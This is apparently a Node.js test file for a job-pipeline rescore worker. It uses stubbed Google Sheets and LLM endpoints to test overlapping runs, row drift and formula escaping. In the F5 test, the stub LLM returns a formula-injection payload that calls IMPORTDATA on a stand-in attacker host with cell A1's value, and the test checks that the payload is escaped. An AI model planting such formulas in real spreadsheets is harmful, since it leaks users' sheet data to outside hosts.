// Promotes .lane-evidence/ref/probes-F/F-rescore-overlap.mjs: two overlapping
// rescores against an in-memory Sheet and a stub chat provider. No network:
// globalThis.fetch is replaced before the assertions run.
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  endRouteRescore,
  rescoreAllPipelineRows,
  tryBeginRouteRescore,
} from "../server/profile-rescore-worker.mjs";
import { buildStarterTemplate, listStarterTemplateIds } from "../server/user-profile.mjs";

function pipelineRows() {
  return [1, 2, 3].map((n) => {
    const r = new Array(24).fill("");
    r[1] = `Role ${n}`;
    r[2] = `Co ${n}`;
    r[3] = "Remote";
    r[4] = `http://127.0.0.1:18169/job/${n}`;
    return r;
  });
}

function profiles() {
  const base = buildStarterTemplate(listStarterTemplateIds()[0]);
  const profileA = structuredClone(base);
  profileA.identity.primaryNarrative = "PROFILE-A-OLD narrative";
  const profileB = structuredClone(base);
  profileB.identity.primaryNarrative = "PROFILE-B-NEW narrative";
  return { profileA, profileB };
}

function installStubs({ rows, slowMs = 120, fastMs = 5, onWrite } = {}) {
  const sheet = new Map();
  const writes = [];
  let llmCalls = 0;
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (input, init = {}) => {
    const url = new URL(typeof input === "string" ? input : (input.url ?? String(input)));
    if (url.hostname === "sheets.googleapis.com") {
      if ((init.method || "GET") === "GET") {
        const m = /!E(\d+)\s*$/.exec(decodeURIComponent(url.pathname));
        if (m) {
          const idx = Number(m[1]) - 2;
          return new Response(JSON.stringify({ values: [[rows[idx]?.[4] ?? ""]] }), {
            status: 200,
          });
        }
        return new Response(JSON.stringify({ values: rows }), { status: 200 });
      }
      const body = JSON.parse(init.body);
      for (const d of body.data) sheet.set(d.range, d.values[0][0]);
      writes.push({
        valueInputOption: body.valueInputOption,
        q: body.data.find((d) => d.range.includes("!Q"))?.values[0][0],
      });
      onWrite?.();
      return new Response("{}", { status: 200 });
    }
    if (url.hostname === "stub-llm.invalid") {
      llmCalls += 1;
      const sys = JSON.parse(init.body).messages[0].content;
      const isA = sys.includes("PROFILE-A-OLD");
      await new Promise((r) => setTimeout(r, isA ? slowMs : fastMs));
      const content = JSON.stringify(
        isA
          ? { fitScore: 2, rationale: "old profile", leadAngle: "old angle" }
          : {
              fitScore: 9,
              rationale: "new profile",
              leadAngle: '=IMPORTDATA("https://attacker.invalid/?q="&A1)',
            },
      );
      return new Response(JSON.stringify({ choices: [{ message: { content } }] }), {
        status: 200,
      });
    }
    throw new TypeError(`no-egress: ${url.hostname}`);
  };
  return {
    sheet,
    writes,
    llmCalls: () => llmCalls,
    restore: () => {
      globalThis.fetch = realFetch;
    },
  };
}

const providerConfig = {
  provider: "openai",
  apiKey: "probe-key",
  model: "probe-model",
  baseUrl: "http://stub-llm.invalid/v1",
};

describe("F4: overlapping rescores", () => {
  it("the newer run wins: stale writes are skipped, not last-writer-wins", async () => {
    const stubs = installStubs({ rows: pipelineRows() });
    try {
      const { profileA, profileB } = profiles();
      const common = { sheetId: "probe-sheet", providerConfig, overrideToken: "probe-token" };
      const runA = rescoreAllPipelineRows({ ...common, profile: profileA });
      await new Promise((r) => setTimeout(r, 20));
      const runB = rescoreAllPipelineRows({ ...common, profile: profileB });
      await Promise.all([runA, runB]);
      const final = ["H2", "H3", "H4"].map((c) => stubs.sheet.get(`Pipeline!${c}`));
      assert.deepEqual(final, ["9", "9", "9"], `stale run overwrote: ${JSON.stringify(final)}`);
    } finally {
      stubs.restore();
    }
  });

  it("F4: the HTTP single-flight holds while a run is live", () => {
    assert.equal(tryBeginRouteRescore(), true);
    assert.equal(tryBeginRouteRescore(), false);
    endRouteRescore();
    assert.equal(tryBeginRouteRescore(), true);
    endRouteRescore();
  });

  it("F16: a row whose Link moved since the snapshot is not written", async () => {
    const rows = pipelineRows();
    const stubs = installStubs({ rows, slowMs: 5, fastMs: 5 });
    const realFetch = globalThis.fetch;
    let snapshotTaken = false;
    globalThis.fetch = async (input, init = {}) => {
      const url = new URL(typeof input === "string" ? input : (input.url ?? String(input)));
      if (
        url.hostname === "sheets.googleapis.com" &&
        (init.method || "GET") === "GET" &&
        decodeURIComponent(url.pathname).endsWith("!A2:X")
      ) {
        snapshotTaken = true;
        // A sort lands between the snapshot and the writes: row 4 now
        // holds a different job.
        setTimeout(() => {
          rows[2][4] = "http://127.0.0.1:18169/job/other";
        }, 0);
      }
      return realFetch(input, init);
    };
    /** @type {Array<Record<string, unknown>>} */
    const events = [];
    try {
      const { profileB } = profiles();
      await rescoreAllPipelineRows({
        sheetId: "probe-sheet",
        providerConfig,
        overrideToken: "probe-token",
        profile: profileB,
        onProgress: (e) => events.push(e),
      });
      assert.equal(snapshotTaken, true);
      const ranges = [...stubs.sheet.keys()];
      assert.ok(ranges.some((r) => r.includes("H2")), "row 2 written");
      assert.ok(ranges.some((r) => r.includes("H3")), "row 3 written");
      assert.equal(
        ranges.some((r) => r === "Pipeline!H4"),
        false,
        `drifted row 4 was written: ${JSON.stringify(ranges)}`,
      );
      assert.equal(
        events.some((e) => e.row === 4 && e.reason === "row_drift"),
        true,
        `no row_drift event: ${JSON.stringify(events)}`,
      );
    } finally {
      stubs.restore();
    }
  });

  it("F5: injected formulas in Talking Points are escaped at the sheet", async () => {
    const stubs = installStubs({ rows: pipelineRows(), slowMs: 5, fastMs: 5 });
    try {
      const { profileB } = profiles();
      await rescoreAllPipelineRows({
        sheetId: "probe-sheet",
        providerConfig,
        overrideToken: "probe-token",
        profile: profileB,
      });
      assert.ok(stubs.writes.length > 0, "expected sheet writes");
      for (const w of stubs.writes) {
        assert.equal(w.valueInputOption, "USER_ENTERED");
        assert.match(String(w.q), /^'/, `unescaped formula write: ${w.q}`);
      }
    } finally {
      stubs.restore();
    }
  });
});
